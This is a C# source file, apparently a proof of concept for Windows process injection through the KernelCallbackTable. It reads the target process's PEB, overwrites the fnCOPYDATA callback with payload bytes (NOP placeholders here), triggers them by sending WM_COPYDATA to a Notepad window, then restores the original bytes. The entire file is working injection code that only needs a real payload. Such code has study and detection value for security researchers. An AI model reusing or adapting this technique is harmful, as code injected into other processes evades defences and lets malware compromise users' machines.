using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SendMessageKernelCallback
{
    /*References:
     * 1. https://t0rchwo0d.github.io/windows/Windows-Process-Injection-Technique-KernelCallbackTable/
     * 2. https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/
     */

    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct KernelCallBackTable
        {
            public IntPtr fnCOPYDATA;
            public IntPtr fnCOPYGLOBALDATA;
            public IntPtr fnDWORD;
            public IntPtr fnNCDESTROY;
            public IntPtr fnDWORDOPTINLPMSG;
            public IntPtr fnINOUTDRAG;
            public IntPtr fnGETTEXTLENGTHS;
            public IntPtr fnINCNTOUTSTRING;
            public IntPtr fnPOUTLPINT;
            public IntPtr fnINLPCOMPAREITEMSTRUCT;
            public IntPtr fnINLPCREATESTRUCT;
            public IntPtr fnINLPDELETEITEMSTRUCT;
            public IntPtr fnINLPDRAWITEMSTRUCT;
            public IntPtr fnPOPTINLPUINT;
            public IntPtr fnPOPTINLPUINT2;
            public IntPtr fnINLPMDICREATESTRUCT;
            public IntPtr fnINOUTLPMEASUREITEMSTRUCT;
            public IntPtr fnINLPWINDOWPOS;
            public IntPtr fnINOUTLPPOINT5;
            public IntPtr fnINOUTLPSCROLLINFO;
            public IntPtr fnINOUTLPRECT;
            public IntPtr fnINOUTNCCALCSIZE;
            public IntPtr fnINOUTLPPOINT5_;
            public IntPtr fnINPAINTCLIPBRD;
            public IntPtr fnINSIZECLIPBRD;
            public IntPtr fnINDESTROYCLIPBRD;
            public IntPtr fnINSTRING;
            public IntPtr fnINSTRINGNULL;
            public IntPtr fnINDEVICECHANGE;
            public IntPtr fnPOWERBROADCAST;
            public IntPtr fnINLPUAHDRAWMENU;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD;
            public IntPtr fnOPTOUTLPDWORDOPTOUTLPDWORD_;
            public IntPtr fnOUTDWORDINDWORD;
            public IntPtr fnOUTLPRECT;
            public IntPtr fnOUTSTRING;
            public IntPtr fnPOPTINLPUINT3;
            public IntPtr fnPOUTLPINT2;
            public IntPtr fnSENTDDEMSG;
            public IntPtr fnINOUTSTYLECHANGE;
            public IntPtr fnHkINDWORD;
            public IntPtr fnHkINLPCBTACTIVATESTRUCT;
            public IntPtr fnHkINLPCBTCREATESTRUCT;
            public IntPtr fnHkINLPDEBUGHOOKSTRUCT;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX;
            public IntPtr fnHkINLPKBDLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSLLHOOKSTRUCT;
            public IntPtr fnHkINLPMSG;
            public IntPtr fnHkINLPRECT;
            public IntPtr fnHkOPTINLPEVENTMSG;
            public IntPtr xxxClientCallDelegateThread;
            public IntPtr ClientCallDummyCallback;
            public IntPtr fnKEYBOARDCORRECTIONCALLOUT;
            public IntPtr fnOUTLPCOMBOBOXINFO;
            public IntPtr fnINLPCOMPAREITEMSTRUCT2;
            public IntPtr xxxClientCallDevCallbackCapture;
            public IntPtr xxxClientCallDitThread;
            public IntPtr xxxClientEnableMMCSS;
            public IntPtr xxxClientUpdateDpi;
            public IntPtr xxxClientExpandStringW;
            public IntPtr ClientCopyDDEIn1;
            public IntPtr ClientCopyDDEIn2;
            public IntPtr ClientCopyDDEOut1;
            public IntPtr ClientCopyDDEOut2;
            public IntPtr ClientCopyImage;
            public IntPtr ClientEventCallback;
            public IntPtr ClientFindMnemChar;
            public IntPtr ClientFreeDDEHandle;
            public IntPtr ClientFreeLibrary;
            public IntPtr ClientGetCharsetInfo;
            public IntPtr ClientGetDDEFlags;
            public IntPtr ClientGetDDEHookData;
            public IntPtr ClientGetListboxString;
            public IntPtr ClientGetMessageMPH;
            public IntPtr ClientLoadImage;
            public IntPtr ClientLoadLibrary;
            public IntPtr ClientLoadMenu;
            public IntPtr ClientLoadLocalT1Fonts;
            public IntPtr ClientPSMTextOut;
            public IntPtr ClientLpkDrawTextEx;
            public IntPtr ClientExtTextOutW;
            public IntPtr ClientGetTextExtentPointW;
            public IntPtr ClientCharToWchar;
            public IntPtr ClientAddFontResourceW;
            public IntPtr ClientThreadSetup;
            public IntPtr ClientDeliverUserApc;
            public IntPtr ClientNoMemoryPopup;
            public IntPtr ClientMonitorEnumProc;
            public IntPtr ClientCallWinEventProc;
            public IntPtr ClientWaitMessageExMPH;
            public IntPtr ClientWOWGetProcModule;
            public IntPtr ClientWOWTask16SchedNotify;
            public IntPtr ClientImmLoadLayout;
            public IntPtr ClientImmProcessKey;
            public IntPtr fnIMECONTROL;
            public IntPtr fnINWPARAMDBCSCHAR;
            public IntPtr fnGETTEXTLENGTHS2;
            public IntPtr fnINLPKDRAWSWITCHWND;
            public IntPtr ClientLoadStringW;
            public IntPtr ClientLoadOLE;
            public IntPtr ClientRegisterDragDrop;
            public IntPtr ClientRevokeDragDrop;
            public IntPtr fnINOUTMENUGETOBJECT;
            public IntPtr ClientPrinterThunk;
            public IntPtr fnOUTLPCOMBOBOXINFO2;
            public IntPtr fnOUTLPSCROLLBARINFO;
            public IntPtr fnINLPUAHDRAWMENU2;
            public IntPtr fnINLPUAHDRAWMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU3;
            public IntPtr fnINOUTLPUAHMEASUREMENUITEM;
            public IntPtr fnINLPUAHDRAWMENU4;
            public IntPtr fnOUTLPTITLEBARINFOEX;
            public IntPtr fnTOUCH;
            public IntPtr fnGESTURE;
            public IntPtr fnPOPTINLPUINT4;
            public IntPtr fnPOPTINLPUINT5;
            public IntPtr xxxClientCallDefaultInputHandler;
            public IntPtr fnEMPTY;
            public IntPtr ClientRimDevCallback;
            public IntPtr xxxClientCallMinTouchHitTestingCallback;
            public IntPtr ClientCallLocalMouseHooks;
            public IntPtr xxxClientBroadcastThemeChange;
            public IntPtr xxxClientCallDevCallbackSimple;
            public IntPtr xxxClientAllocWindowClassExtraBytes;
            public IntPtr xxxClientFreeWindowClassExtraBytes;
            public IntPtr fnGETWINDOWDATA;
            public IntPtr fnINOUTSTYLECHANGE2;
            public IntPtr fnHkINLPMOUSEHOOKSTRUCTEX2;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }
        public struct COPYDATASTRUCT
        {
            public IntPtr dwData;
            public int cbData;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpData;
        }

        public const int PROCESSBASICINFORMATION = 0;
        public const uint WM_COPYDATA = 0x4A;
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,int dwSize, out int lpNumberOfbytesRW);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr hWndChildAfter, string className, string windowTitle);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out int lpNumberOfBytesWritten);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, ref COPYDATASTRUCT lParam);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);
        static void Main(string[] args)
        {
            int pid = int.Parse(args[0]);
            Console.WriteLine("Process id: " + pid);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            Console.WriteLine("Obtained handle to the process: " + hProcess.ToString("X"));

            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr kernelcallbackAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x58);
            Console.WriteLine($"Got Kernel Callback address of process at {"0x" + kernelcallbackAddr.ToString("x")}");

            int bytesRead = 0;
            byte[] buffer = new byte[0x8];
            bool result = ReadProcessMemory(hProcess, kernelcallbackAddr, buffer, buffer.Length, out bytesRead);
            Console.WriteLine(bytesRead + " bytes read!");
            IntPtr kernelcallbackval = (IntPtr)BitConverter.ToInt64(buffer, 0);
            Console.WriteLine("Kernel CallbackTable: " + kernelcallbackval.ToString("X"));

            int size = Marshal.SizeOf(typeof(KernelCallBackTable));
            byte[] bytes = new byte[size];
            ReadProcessMemory(hProcess, kernelcallbackval, bytes, size, out _);
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            KernelCallBackTable kernelstruct = (KernelCallBackTable)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(KernelCallBackTable));
            handle.Free();
            Console.WriteLine("Value at fnCOPYDATA: " + kernelstruct.fnCOPYDATA.ToString("X"));

            int no_bytes;

            byte[] buf = new byte[4] {0x90,0x90,0x90,0x90};

            byte[] orig_data = new byte[buf.Length];
            //Copying original fnCOPYDATA bytes
            ReadProcessMemory(hProcess, kernelstruct.fnCOPYDATA, orig_data, orig_data.Length,out no_bytes);
            Console.WriteLine(no_bytes + " original bytes copied!");

            //Writing payload into fnCOPYDATA
            bool res = WriteProcessMemory(hProcess, kernelstruct.fnCOPYDATA, buf, buf.Length, out no_bytes);
            Console.WriteLine(no_bytes + " payload bytes written to fnCOPYDATA!");

            //In this case, injecting into notepad.exe and hence classname used is notepad
            IntPtr hwindow = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "notepad", null);
            Console.WriteLine("Obtained handle to window: " + hwindow.ToString("X"));

            string msg = "Pwned!\0";

            var cds = new COPYDATASTRUCT
            {
                dwData = new IntPtr(3),
                cbData = msg.Length,
                lpData = msg
            };
            SendMessage(hwindow, WM_COPYDATA, IntPtr.Zero, ref cds);
            Console.WriteLine("SendMessage triggered!");
            
            //Restore original value of fnCOPYDATA
            res = WriteProcessMemory(hProcess, kernelstruct.fnCOPYDATA, orig_data, orig_data.Length, out no_bytes);
            Console.WriteLine(no_bytes + " original bytes written back to fnCOPYDATA!");

            CloseHandle(hProcess);
            CloseHandle(hwindow);            

        }
    }
}
